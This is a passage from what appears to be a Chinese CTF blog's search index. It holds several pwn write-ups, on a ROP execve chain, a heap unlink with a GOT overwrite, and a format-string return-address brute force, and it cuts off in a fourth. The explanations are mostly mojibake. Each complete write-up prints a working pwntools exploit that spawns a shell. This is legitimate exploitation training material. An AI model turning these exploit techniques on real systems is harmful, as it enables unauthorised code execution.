: int 0x80 ç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¡«å…¥ ebx å¯„å­˜å™¨çš„/bin/shã€‚ç»“æœæ˜¯æ²¡æœ‰/bin/sh PS.è¿™é‡Œä¸èƒ½ç›´æ¥æ‰¾shå­—ç¬¦ä¸²ï¼Œå› ä¸º execve å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ pathï¼Œå¿…é¡»æ˜¯ç»å¯¹åœ°å€ï¼Œè€Œä¸”å¿…é¡»æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæˆ–è€…è„šæœ¬æ–‡ä»¶ï¼Œä½†æ˜¯åªä¼šæ‰§è¡Œ!#ä¹‹åçš„é‚£ä¸ªè§£é‡Šå™¨ï¼‰ã€‚åœ¨ Linux ç³»ç»Ÿç§çš„shå‘½ä»¤æ˜¯è½¯é“¾æ¥ï¼Œå¹¶ä¸æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶\nå…·ä½“å¯ä»¥æŸ¥çœ‹è¿™ç¯‡åšå®¢ï¼Œè¿™ç¯‡åšå®¢ä¹Ÿå¾ˆä¸é”™\næ²¡æœ‰ç°æˆ\u0026quot;/bin/sh\u0026quot;ï¼šæ„å»ºå­—ç¬¦ä¸² è¿™é¢˜æ˜¯é™æ€é“¾æ¥ï¼Œæ²¡æ³• ret2libcã€‚\nä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸€å¤„æ²¡æœ‰ç”¨åˆ°çš„åœ°å€ï¼Œåˆ©ç”¨ä¸€äº› gadget å°†æˆ‘ä»¬éœ€è¦çš„å€¼å†™è¿›å»ï¼Œç„¶åæˆ‘ä»¬å°±å¾—åˆ°äº†ä¸€ä¸ªç¨‹åºå¯ä»¥ä½¿ç”¨çš„\u0026quot;/bin/sh\u0026quot;å­—ç¬¦ä¸²åœ°å€ï¼\né¦–å…ˆæˆ‘ä»¬éœ€è¦ä¸€æ¡æŒ‡ä»¤ï¼Œæ”¯æŒæˆ‘ä»¬å‘å†…å­˜ä¸­å†™å…¥å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ pop æ ˆä¸­çš„å€¼åˆ°å¯„å­˜å™¨ï¼Œå†å°†ç©ºé—²å†…å­˜çš„åœ°å€èµ‹ç»™å¦ä¸€ä¸ªå¯„å­˜å™¨ï¼Œè¿™æ ·å°±å¯ä»¥å‘ç©ºé—²åœ°å€å†™å…¥å€¼äº†\né€šè¿‡ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;mov|ret\u0026quot;å‘½ä»¤ç„¶åæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªå¯ç”¨çš„ gadgetï¼š\n# dwordè¡¨ç¤ºåŒå­—ï¼Œå°±æ˜¯å››ä¸ªå­—èŠ‚ï¼Œåˆšå¥½æ˜¯32ä½å¯„å­˜å™¨çš„å¤§å° 0x080557ab : mov dword ptr [edx], eax ; ret ç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ä¹‹å‰æ‰¾åˆ°è¿‡çš„pop edx;pop ecx;pop ebx;retå°†åœ°å€å¼¹åˆ° edx ä¸­\nç„¶åæˆ‘ä»¬ç”¨ ida æ‰¾åˆ°ä¸€å—é—²ç½®ç©ºé—´ï¼ˆä¸€ç›´æ»šåˆ°.data æ®µï¼Œæœ€åæœ‰ä¸€å°æ®µé‡å¤çš„ db 0ï¼‰\nç„¶åæˆ‘ä»¬å°±å¯ä»¥å®Œæˆæˆ‘ä»¬çš„ payload äº†ï¼š\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) å®Œæ•´ exp2 from pwn import * from pwn import p64, p32 pss: bool = False fn: str = \u0026#34;./get_started_3dsctf_2016\u0026#34; # libc_name: str = \u0026#34;\u0026#34; port: str = \u0026#34;\u0026#34; if_32: bool = True pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if_debug: bool = False if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: shell = gdb.debug(fn, \u0026#34;b* 0x8048A40\u0026#34;) else: p = process(fn) pop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) if if_debug: shell.sendline(payload) shell.interactive() else: p.sendline(payload) p.interactive() ä¸€äº›æ‚¬è€Œæœªå†³çš„å°é—®é¢˜ ä½œè€…è¯•å›¾ä¸ä½¿ç”¨pop edx;pop ecx;pop ebx;retåªä½¿ç”¨pop edx;ret æˆ‘ä»¬ç”¨ ROPgadget --binary get_started_3dsctf_2016 --only \u0026quot;pop|ret\u0026quot;å‘½ä»¤æ‰¾åˆ°äº†pop edxçš„å‘½ä»¤\n0x0806fc0a : pop edx ; ret çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰é—®é¢˜\nä»¤äººç–‘æƒ‘çš„æ˜¯ï¼Œè¿™æ ·å­è¿æ ˆéƒ½æ²¡æ³•å†™å…¥(åœ¨ pop eax åå°±æ˜¯è¿ä¸²çš„ popal)ï¼Œå¯èƒ½æ˜¯æˆ‘æ‰¾çš„è¿™ä¸ª gadget æœ¬èº«æœ‰ç‚¹å°é—®é¢˜\nä½†æ˜¯æˆ‘å°è¯•äº†pop ecx;pop ebx;retå’Œmov [ecx+4], eaxï¼Œç¨‹åºå®Œå…¨æ­£å¸¸è¿ä½œï¼Œå¯ä»¥æ­£å¸¸å¾—åˆ° shell\npayload å¦‚ä¸‹ï¼š\npop_eax_ret = 0x080b91e6 pop_edx_ecx_ebx_ret = 0x0806fc30 int80 = 0x0806d7e5 mov_edx_eax_ret = 0x080557ab spare_space = 0x080EB0C0 pop_edx_ret = 0x0806fc0a pop_ecx_ebx_ret = 0x0806fc31 mov_ecx_eax_ret = 0x080701a5 # è¿™é‡Œä¸€å®šè¦-4ï¼Œå› ä¸ºgadgetåŠ äº†4 payload = b\u0026#39;a\u0026#39;*0x38+pg(pop_eax_ret)+b\u0026#34;/bin\u0026#34;+pg(pop_ecx_ebx_ret) + \\ pg(spare_space-4)+pg(0)+pg(0)+pg(mov_ecx_eax_ret) payload += pg(pop_eax_ret)+b\u0026#39;/sh\\x00\u0026#39;+pg(pop_edx_ecx_ebx_ret) + \\ pg(spare_space+4)+pg(0)+pg(0)+pg(mov_edx_eax_ret) payload += pg(pop_eax_ret)+pg(0xb)+pg(pop_edx_ecx_ebx_ret) + \\ pg(0)+pg(0)+pg(spare_space)+pg(int80) æ— æ³•æ‰§è¡Œå…¶ä»–äºŒè¿›åˆ¶æ–‡ä»¶ ä½œè€…ä¸€å¼€å§‹è¯•å›¾execve(\u0026quot;sh\u0026quot;, 0, 0)ï¼Œä½†æ˜¯æŸ¥é˜…èµ„æ–™åæ˜ç™½åªèƒ½æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œäºæ˜¯åˆè¯•å›¾æ‰§è¡Œ/bin/lså’Œ/usr/bin/python3.10ï¼Œä½†æ˜¯å‡å› ä¸æ˜åŸå› å¤±è´¥äº†\nå¦‚æœå„ä½çœ‹å®˜çŸ¥é“äº†åŸå› ï¼Œå¯ä»¥åŠ³çƒ¦æ‚¨åœ¨è¯„è®ºåŒºä¸ºä½œè€…å’Œåæ¥äººä½œä¸€ç•ªè§£é‡Šå—ï¼Ÿæ„Ÿæ¿€ä¸å°½ï¼\n","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/syscallget_started_3dsctf_2016/","section":"writeup","summary":"We are shaped by our thoughts; we become what we think. When the mind is pure, joy follows like a shadow that never leaves. â€” Buddha åŸé¢˜é“¾æ¥ åœ¨åšé¢˜å‰ï¼Œæˆ‘å…ˆä¸ºå…¶å»ºç«‹äº†ä¸€ä¸ªä¸“é—¨çš„å·¥ä½œç›®å½•ï¼š ã€syscallã€‘ã€Write-upã€‘BUUC","tags":["pwn","syscall"],"title":"ã€syscallã€‘get_started_3dsctf_2016"},{"categories":["writeup"],"contents":" Friendship always benefits; love sometimes injures. â€” Seneca the Younger\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªä»£ç  å…¸å‹çš„å †èœå•é¢˜\nä»‹ç»ä¸€ä¸‹unlink unlinkå…¶å®å°±æ˜¯å¾ˆæ™®é€šï¼Œå¾ˆå¸¸è§„çš„ä¸€ç§ä»åŒå‘é“¾è¡¨ä¸­å–å‡ºèŠ‚ç‚¹çš„æœºåˆ¶\nå½“æˆ‘ä»¬freeæ‰ä¸€ä¸ªchunkçš„æ—¶å€™ï¼Œç¨‹åºä¼šæŸ¥çœ‹ç›¸é‚»çš„chunkæ—¶å€™ä¹Ÿè¢«freeæ‰äº†ï¼Œå¦‚æœä¹Ÿè¢«freeæ‰äº†ï¼Œå°±æŠŠå®ƒä»åŒå‘é“¾è¡¨ä¸­å–å‡ºæ¥ï¼ˆæ³¨æ„fastbinæ˜¯å•å‘é“¾è¡¨ï¼‰ï¼Œæ‰§è¡Œunlinkï¼Œä¸å½“å‰freeçš„chunkåˆå¹¶ï¼Œç„¶åæ”¾å…¥å®ƒåº”è¯¥å»çš„binä¸­\næˆ‘ä»¬çš„chunkæœ‰fdå’Œbkä¸¤ä¸ªåŸŸï¼Œåˆ†åˆ«æŒ‡å‘ï¼ˆé“¾è¡¨ä¸­ï¼‰å‰ä¸€ä¸ªchunkå’Œåä¸€ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒfdåŸŸé‡Œä¿å­˜çš„æ˜¯å‰ä¸€ä¸ªchunkçš„åœ°å€ï¼Œbkæ˜¯åä¸€ä¸ªchunkçš„åœ°å€\nunlinkä¼šæ›´æ”¹chunk0å’Œchunk2çš„çš„fdå’ŒbkæŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´\nchunk0-\u0026gt;bk = chunk2 chunk2-\u0026gt;fd = chunk0 åˆå› ä¸ºfdå’Œbkåœ¨åŒæ ·ä½æ•°çš„ç³»ç»Ÿï¼Œæ¯”å¦‚64ä½çš„ç³»ç»Ÿä¸‹ï¼Œç›¸è¾ƒäºchunkæŒ‡é’ˆçš„åç§»æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ï¼Œä¸Šé¢çš„ä»£ç åˆç­‰ä»·äº\n*(chunk0 + 0x18) = chunk2 *(chunk2 + 0x10) = chunk0 è€Œæ­¤æ—¶ï¼Œå¦‚æœæˆ‘ä»¬è¦unlinkçš„chunkçš„fdåŸŸå’ŒbkåŸŸï¼Œåˆ™ä¸Šé¢çš„ä»£ç ä¼šäº§ç”Ÿè¿™æ ·çš„æ•ˆæœï¼š *(ptr1 + 0x18) = ptr2 *(ptr2 + 0x10) = ptr1 é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹ptr1ä¸‹æ–¹0x10ä½ç½®å’Œ0x18ä½ç½®çš„å€¼äº†ï¼\nä½†æ˜¯è¿™ä¸ªunlinkæœºåˆ¶è¿˜å­˜åœ¨ç€ä¸€ç³»åˆ—å®‰å…¨æ£€æŸ¥ï¼š\nè¿™äº›æ£€æŸ¥ç¡®ä¿ï¼š\nè¦è¿›è¡Œunlinkçš„chunkçš„sizeä½å’Œå½“å‰è¢«freeçš„chunkçš„prev_sizeä½ç›¸åŒï¼ŒåŒæ—¶å®ƒçš„prev_inuseä½è¦ç½®é›¶ è¦è¿›è¡Œunlinkçš„chunkçš„ä¸Šä¸€ä¸ªchunkçš„bkä½æŒ‡å‘å½“å‰chunkï¼Œä¸‹ä¸€ä¸ªchunkçš„fdä½æŒ‡å‘å½“å‰chunk ä¹Ÿå°±æ˜¯è¯´ï¼š *(ptr1 + 0x18) == chunk1 *(ptr2 + 0x10) == chunk1 å¦‚ä½•ç»•è¿‡ï¼Ÿ ç³»ç»ŸæœŸå¾…çš„æ˜¯ä¸Šä¸€ä¸ªchunkçš„bkåŸŸå†…å­˜çš„å€¼æ˜¯chunk1ï¼Œä¸‹ä¸€ä¸ªchunkçš„fdåŸŸå†…å­˜çš„å€¼ä¹Ÿæ˜¯chunk1ï¼Œå½“æˆ‘ä»¬å¯ä»¥è®©\nptr1 = \u0026amp;chunk1 - 0x18 ptr2 = \u0026amp;chunk1 - 0x10 è¿™æ ·å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œè¿™æ ·æœ€åçš„ç»“æœå°±æ˜¯ï¼š\nchunk1 = \u0026amp;chunk1 - 0x10 chunk1 = \u0026amp;chunk1 - 0x18 æˆ‘ä»¬è®©chunk1å˜æˆäº†å­˜æ”¾chunk1çš„å†…å­˜ä¸Šæ–¹0x18è¿™ä¸ªåœ°å€\nç„¶åæˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹å­˜æ”¾chunk1çš„å†…å­˜çš„å€¼ï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼\næœ¬é¢˜æ€è·¯ ç”³è¯·ä¸‰å—0x80çš„chunkï¼Œåœ¨ç¬¬ä¸€å—chunkå†…ä¼ªé€ ä¸€ä¸ª0x70çš„å·²freeçš„chunkï¼Œç„¶åæ›´æ”¹ä¸‹ä¸€ä¸ªchunkçš„prev_sizeä½å’Œsizeä½ä»è€Œå®ç°unlink\nç„¶åæˆ‘ä»¬å¯ä»¥æ›´æ”¹å­˜æ”¾chunk1çš„å†…å­˜çš„å€¼ï¼Œå°†å…¶æ”¹ä¸ºatoiçš„gotå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ³„éœ²å‡ºlibcçš„åŸºå€\nç„¶åæˆ‘ä»¬åˆå¯ä»¥æ›´æ”¹atoiçš„gotå€¼ï¼Œæ”¹ä¸ºsystemï¼Œå†ä¼ å…¥\u0026quot;/bin/sh\\x00\u0026quot;å³å¯\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./bamboobox\u0026#34; libc_name:str = \u0026#34;/home/giantbranch/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;27469\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400E42 c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) def show(index: int) -\u0026gt; bytes: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.recvuntil(f\u0026#34;{index} : \u0026#34;) return p.recv(6) def add(size: int, name: str): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(size)) p.clean() p.sendline(name) def change(index: int, name: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(len(name)+1)) p.clean() p.sendline(name) def remove(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) ptr = 0x6020c8 add(0x80, b\u0026#34;0\u0026#34;) add(0x80, b\u0026#34;1\u0026#34;) add(0x80, b\u0026#34;/bin/sh\\x00\\x00\u0026#34;) payload = (pg(0) + pg(0x80) + pg(ptr - 0x18) + pg(ptr - 0x10)).ljust(0x80, b\u0026#34;\\x00\u0026#34;) + pg(0x80) + pg(0x90) change(0, payload) remove(1) payload = b\u0026#34;\\x00\u0026#34;*0x10 + pg(0x80) + pg(m_elf.got[\u0026#39;atoi\u0026#39;]) change(0, payload) libcbase = u64(show(0).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#39;atoi\u0026#39;] success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] change(0, pg(system_addr)) p.sendlineafter(b\u0026#34;Your choice:\u0026#34;, b\u0026#34;/bin/sh\\x00\u0026#34;) p.clean() p.interactive() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/unlinkbuuctf-hitcontraining_unlink/","section":"writeup","summary":"Friendship always benefits; love sometimes injures. â€” Seneca the Younger åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ä¼ªä»£ç  å…¸å‹çš„å †èœå•é¢˜ ä»‹ç»ä¸€ä¸‹unlink unlinkå…¶å®å°±æ˜¯å¾ˆæ™®é€šï¼Œå¾ˆå¸¸è§„çš„ä¸€ç§ä»åŒ","tags":["pwn","unlink","å †"],"title":"ã€unlinkã€‘BUUCTF hitcontraining_unlink"},{"categories":["writeup"],"contents":" The longer we dwell on our misfortunes, the greater is their power to harm us. â€” Voltaire\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ æ„å»ºåœ°å€é“¾ çˆ†ç ´ å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec xman_2019_format [*] \u0026#39;/home/giantbranch/share_files/security/workspace/xman_2019_format/xman_2019_format\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ•´ä¸ªç¨‹åºåç¼–è¯‘å‡ºæ¥é€»è¾‘éå¸¸æ··ä¹±ï¼Œä½†é‡è¦çš„åªæœ‰ä¸‰ä¸ªå‡½æ•°ï¼š æœ‰ä¸€ä¸ªåé—¨å‡½æ•°\nè¿™ä¸ªå‡½æ•°è¯´æ˜äº†bufä¹Ÿå°±æ˜¯ä¿å­˜å­—ç¬¦ä¸²çš„åœ°å€åœ¨å †ä¸­\nè¿™ä¸ªå‡½æ•°è¯´æ˜ä¼šå°†bufä¸­çš„å­—ç¬¦ä¸²ä»¥|ä¸ºåˆ†å‰²ç¬¦åˆ†å‰²æˆå¤šä¸ªå­å­—ç¬¦ä¸²å¹¶æ‰“å°\nè¿™ä¸ªç¨‹åºå› ä¸ºåªæœ‰ä¸€æ¬¡è¾“å…¥çš„æœºä¼šï¼Œè€Œä¸”æ— æ³•æ›´æ”¹retå€¼ï¼Œæ‰€ä»¥è·å–shellæƒé™è¦ä¸€æ¬¡åˆ°ä½åœ°å®Œæˆï¼Œå› æ­¤è™½ç„¶å¯ä»¥æ³„éœ²æ ˆåœ°å€å´éš¾ä»¥åŠ ä»¥åˆ©ç”¨ã€‚\nå› æ­¤å¦‚æœæˆ‘ä»¬è¦æ›´æ”¹æ ˆåœ°å€ï¼Œå°±éœ€è¦ç”¨åˆ°çˆ†ç ´\næ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ é¦–å…ˆï¼Œæ¯æ¬¡åŠ è½½ç¨‹åºçš„æ—¶å€™ï¼Œæ ˆåŸºå€éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯å12ä½ä¸º0\nå…¶æ¬¡ï¼Œå› ä¸ºé¡µå¯¹é½çš„å½±å“ï¼Œå› æ­¤æ ˆåœ°å€é™¤äº†æ ˆåŸºå€è¿˜è¦åŠ ä¸Šä¸€ä¸ªé¡µåœ°å€ï¼Œè¿™ä¸ªé¡µåœ°å€ä¸€å®šæ˜¯4KBçš„æ•´æ•°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªé¡µåœ°å€å¯¹æœ€å12ä½æ˜¯æ²¡æœ‰å½±å“çš„\nç„¶åï¼Œæ ˆåœ°å€è¿˜è¦åŠ ä¸Šä¸€ä¸ªåç§»ï¼Œè¿™ä¸ªåç§»ä¼šå¯¹æ ˆåœ°å€å12ä½é€ æˆå½±å“ï¼Œç»è¿‡è°ƒè¯•å‘ç°ï¼ŒåŒä¸€ä¸ªåœ°å€åœ¨æ¯æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œæœ€å4ä½ä¹Ÿå°±æ˜¯åœ°å€çš„æœ€åä¸€ä¸ª16è¿›åˆ¶æ•°æ˜¯ä¸å˜çš„\nä¸”çœ‹ä¸‹è¿°ç¨‹åºï¼š\n#include\u0026lt;stdio.h\u0026gt; int main(void){ int a = 1; printf(\u0026#34;%p\\n\u0026#34;, \u0026amp;a); return 0; } è¿è¡Œç»“æœï¼š\nå¯ä»¥çœ‹åˆ°ï¼Œå¯¹äº64ä½ç¨‹åºï¼Œæ ˆåœ°å€ä¹Ÿæ˜¯åªæœ‰æœ€åä¸€ä½ä¸å˜\næˆ‘ä»¬å†æ¥çœ‹ä¸‹32ä½ç¨‹åºçš„æƒ…å†µï¼š\nç»“è®ºå’Œ64ä½ç¨‹åºæ˜¯ä¸€æ ·çš„\nç¬”è€…ä¹Ÿä¸çŸ¥é“äº§ç”Ÿæ­¤ç°è±¡çš„æ ¹æœ¬åŸå› ï¼Œåªèƒ½å½“ä½œä¸€ä¸ªæ—¢å®šäº‹å®è®°äº†ã€‚å¦‚æœæœ‰å¸ˆå‚…çŸ¥é“æ­¤ç°è±¡çš„åŸå› ï¼Œå¸Œæœ›èƒ½åœ¨è¯„è®ºåŒºç•™ä¸‹æ‚¨çš„è§£é‡Šï¼Œæ„Ÿè°¢æ‚¨çš„ä»˜å‡ºï¼\nç¬”è€…çŒœæµ‹åŸå› ï¼šæ¯æ¬¡ç¨‹åºå¼€å§‹æ—¶ä¼šä¿è¯æ ˆåœ°å€æœ€åä¸€ä½ä¸º0ï¼Œè¿™æ ·ç»è¿‡æ—¢å®šæ•°é‡çš„popå’Œpushï¼Œåœ¨åŒä¸€ä¸ªç›¸å¯¹ä½ç½®çš„æ ˆåœ°å€çš„æœ€åä¸€ä½æ˜¯ä¸å˜çš„\næ„å»ºåœ°å€é“¾ å¦‚å›¾ï¼Œå¦‚æœæˆ‘ä»¬ç”¨%hhnå°†ebpä½ç½®æŒ‡å‘çš„åœ°å€æ”¹ä¸ºretåœ°å€ï¼Œé‚£ä¹ˆ0xffffd3b8ä¿å­˜çš„åœ°å€å°±æ˜¯retåœ°å€ï¼Œè¿™æ ·å­æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¬¬ä¸‰ä¸ªçº¢æ¡†æ¡†è¿™æ¡é“¾æ¥æ›´æ”¹retåœ°å€äº†\nçˆ†ç ´ ä¸Šè¿°é€»è¾‘æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬éœ€è¦æ›´æ”¹æ ˆåœ°å€çš„æœ«ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œè¿™ä¸ªå­—èŠ‚çš„é«˜å››ä½æ˜¯ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœæ›´æ”¹ï¼Œåˆ™åªæœ‰$\\frac{1}{16}$çš„å‡ ç‡æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åŠ ä¸€ä¸ªwhileå¾ªç¯å¤šè¯•å‡ æ¬¡å°±å¥½äº†\nå®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher import sys pss: bool = False fn: str = \u0026#34;./xman_2019_format\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;28711\u0026#34; if_32: bool = False pg = p32 if if_32 else p64 context(arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal=[\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] if_debug: bool = False m_elf = ELF(fn) libc = ELF(libc_name) backdoor = 0x80485AB offset1 = 10 len1 = 0x6c offset2 = 18 len2 = 0x85AB format_string = f\u0026#39;%{len1}c%{offset1}$hhn|%{len2}c%{offset2}$hn\u0026#39; success(format_string) while(True): if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;b* 0x400BA1\u0026#34;,) else: p = process(fn, env={\u0026#34;LD_PRELOAD\u0026#34;: libc_name}) p.clean() p.send(format_string) gdb.attach(p, \u0026#34;b* 0x804860B\u0026#34;) p.clean() try: p.interactive() except: info(\u0026#34;failed!\u0026#34;) p.close() ","date":"2022å¹´12æœˆ29æ—¥","permalink":"https://peterliuzhi.top/writeup/%E7%88%86%E7%A0%B4%E6%A0%88%E6%9C%AB%E4%BD%8Dxman_2019_format/","section":"writeup","summary":"The longer we dwell on our misfortunes, the greater is their power to harm us. â€” Voltaire åŸé¢˜é“¾æ¥ checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp ASLRå¯¹æ ˆçš„å½±å“ æ„å»ºåœ°å€é“¾ çˆ†ç ´ å®Œæ•´exp chec","tags":["pwn","çˆ†ç ´æ ˆæœ«ä½"],"title":"ã€çˆ†ç ´æ ˆæœ«ä½ã€‘xman_2019_format"},{"categories":["writeup"],"contents":" Never complain and never explain. â€” Benjamin Disraeli\nåŸé¢˜é“¾æ¥\nchecksecæŸ¥çœ‹ç¨‹åºæ¶æ„ idaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® å®Œæ•´exp checksecæŸ¥çœ‹ç¨‹åºæ¶æ„ $ checksec fm [*] \u0026#39;/home/peterl/security/workspace/fm/fm\u0026#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) æœ‰canaryï¼Œé‚£ä¼ ç»Ÿçš„æ ˆæº¢å‡ºè‚¯å®šä¸è¡Œäº†\nidaæŸ¥çœ‹ç¨‹åºä¼ªä»£ç  æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è¿è¡Œsystem(\u0026quot;/bin/sh)å°±å¿…é¡»è®©xç­‰äº4ã€‚ä½†æ˜¯æˆ‘ä»¬ç‚¹è¿›xçœ‹ä¸€ä¸‹ï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªç­‰äº3çš„å…¨å±€å˜é‡ï¼ˆè¦æ˜¯ä¿å­˜åœ¨.rodataèŠ‚å°±å¯„äº†ï¼‰ï¼š\næˆ‘ä»¬çœ‹ä¸€ä¸‹ç¨‹åºä»£ç ï¼Œå‘ç°è¿™ä¹ˆä¸¤è¡Œï¼š\nread(0, buf, 0x50u); printf(buf); ç›´æ¥æ‰“å°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œç«‹é©¬æƒ³åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆæ‰€ä»¥ç»å¯¹ä¸èƒ½å¤ªè¿‡ç›¸ä¿¡ç”¨æˆ·çš„è¾“å…¥â€¦â€¦ï¼‰\næ„å»ºexp æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–ä»»æ„åœ°å€æ•°æ® è¿™ç§æ–¹æ³•åŸºäºï¼š\nformatå­—ç¬¦ä¸²ä¼šè¢«ä¿å­˜åœ¨æ ˆä¸­ %nå¯ä»¥ä½¿ç”¨ æˆ‘ä»¬é¦–å…ˆè¦æ‰¾åˆ°è¿™ä¸ªformatå­—ç¬¦ä¸²æ•°æ®å’Œespçš„åç§»ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥ä¸€å¤§ä¸²aï¼Œç­‰åˆ°call printfçš„æ—¶å€™æŸ¥çœ‹æ ˆï¼š\næˆ‘ä»¬çœ‹åˆ°æ 